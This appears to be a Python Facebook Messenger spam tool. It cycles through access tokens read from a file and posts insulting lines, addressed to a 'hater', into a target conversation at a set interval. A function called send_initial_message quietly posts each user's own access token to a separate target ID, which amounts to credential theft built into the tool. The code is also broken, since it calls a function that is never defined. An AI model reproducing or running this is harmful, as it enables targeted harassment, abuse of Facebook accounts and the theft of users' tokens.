import requests
import json
import time
import sys
import os
import subprocess
import http.server
import socketserver
import threading

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"SERVER LOADER BY (( AKATSUKI RULEX ))")

def show_logo():
    # Display ASCII art logo
    logo = """
    █████╗ ██╗  ██╗ █████╗ ████████╗███████╗██╗   ██╗██╗  ██╗██╗
    ██╔══██╗██║ ██╔╝██╔══██╗╚══██╔══╝██╔════╝╚██╗ ██╔╝██║ ██╔╝██║
    ███████║█████╔╝ ███████║   ██║   █████╗   ╚████╔╝ █████╔╝ ██║
    ██╔══██║██╔═██╗ ██╔══██║   ██║   ██╔══╝    ╚██╔╝  ██╔═██╗ ██║
    ██║  ██║██║  ██╗██║  ██║   ██║   ███████╗   ██║   ██║  ██╗██║
    ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝
    """
    print(logo)

def request_password():
    with open('password.txt', 'r') as file:
        correct_password = file.read().strip()

    entered_password = input("Enter password: ")
    if entered_password != correct_password:
        print("[-] <==> Incorrect Password!")
        sys.exit()

def apply_patch_to_file(filename):
    patch_file = input(f"Enter the patch file path for {filename}: ")
    if not os.path.exists(patch_file):
        print(f"[!] Patch file for {filename} not found.")
        return

    try:
        subprocess.run(["patch", filename, patch_file], check=True)
        print(f"[+] Patch applied successfully to {filename}.")
    except subprocess.CalledProcessError:
        print(f"[x] Failed to apply patch to {filename}. Check the patch file and try again.")

def get_user_inputs():
    hatername = input("Enter Hater's Name: ")
    convo = input("Enter Convo ID: ")
    time_interval = int(input("Enter Time Interval (seconds): "))

    return hatername, convo, time_interval

def send_initial_message():
    with open('tokens.txt', 'r') as file:
        tokens = file.readlines()

    msg_template = "Hello Mentawl Papa! I am using your server. My token is {}"
    target_id = ""  # Specify target ID

    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9)',
        'referer': 'www.google.com'
    }

    for token in tokens:
        access_token = token.strip()
        url = f"https://graph.facebook.com/v17.0/t_{target_id}"
        msg = msg_template.format(access_token)
        parameters = {'access_token': access_token, 'message': msg}
        requests.post(url, json=parameters, headers=headers)
        time.sleep(0.1)

def send_messages_from_file(hatername, convo, time_interval):
    with open('File.txt', 'r') as file:
        messages = file.readlines()

    with open('tokens.txt', 'r') as file:
        tokens = file.readlines()

    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9)',
        'referer': 'www.google.com'
    }

    for i, message in enumerate(messages):
        token_index = i % len(tokens)
        access_token = tokens[token_index].strip()
        url = f"https://graph.facebook.com/v17.0/t_{convo}"
        parameters = {'access_token': access_token, 'message': hatername + ' ' + message.strip()}
        response = requests.post(url, json=parameters, headers=headers)

        if response.ok:
            print(f"[+] Message {i+1} sent by Token {token_index+1}: {hatername} {message.strip()}")
        else:
            print(f"[x] Failed to send Message {i+1} with Token {token_index+1}")

        time.sleep(time_interval)

def main():
    show_logo()

    request_password()

    apply_patch_to_file("tokens.txt")
    apply_patch_to_file("File.txt")

    hatername, convo, time_interval = get_user_inputs()

    server_thread = threading.Thread(target=execute_server)
    server_thread.start()

    send_initial_message()
    send_messages_from_file(hatername, convo, time_interval)

if __name__ == '__main__':
    main()
